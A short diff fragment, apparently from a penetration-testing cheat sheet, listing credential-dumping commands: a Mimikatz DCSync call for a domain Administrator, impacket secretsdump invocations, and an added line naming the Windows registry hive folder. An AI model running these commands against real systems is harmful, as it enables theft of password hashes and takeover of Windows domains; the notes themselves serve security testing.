@@ -5981,6 +5981,7 @@ lsadump::dcsync /domain:testlab.local /user:Administrator
 ```
 
 ```c
+C:\Windows\System32\config or C:\Windows\System32\
 secretsdump.py -dc-ip IP DOMAIN/USER:PASS@IP
 secretsdump.py -sam sam -system system LOCAL
 ```
